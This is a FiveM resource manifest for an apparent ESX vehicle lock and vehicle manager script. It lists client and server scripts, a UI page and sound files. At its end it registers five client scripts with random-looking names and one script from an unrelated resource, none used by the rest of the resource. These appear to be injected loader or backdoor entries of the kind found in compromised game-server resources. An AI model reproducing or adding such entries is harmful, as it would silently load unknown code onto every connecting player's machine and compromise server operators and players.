fx_version "bodacious"
games {"gta5"}

client_scripts {
    '@es_extended/locale.lua',
    "config/shared.lua",
    "client/VehicleManager_CL.lua",
    "client/client.lua",
    'locales/en.lua',
    'locales/pl.lua'
}

server_scripts {
    '@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
    "config/shared.lua",
    "server/chatCommand.lua",
    "server/server.lua",
    'locales/en.lua',
    'locales/pl.lua'
}

ui_page 'client/html/index.html'

files {
    'client/html/index.html',
    'client/html/sounds/lock.ogg',
    'client/html/sounds/unlock.ogg'
}

client_script 'hhYssoQzTw.lua'

client_script 'yNRAjBoDfD.lua'

client_script 'QqNzIQCOFF.lua'

client_script 'RttmwKmlas.lua'

client_script 'PaFQARUIWz.lua'


client_script '@pozdoodtajczyka/client/main.lua'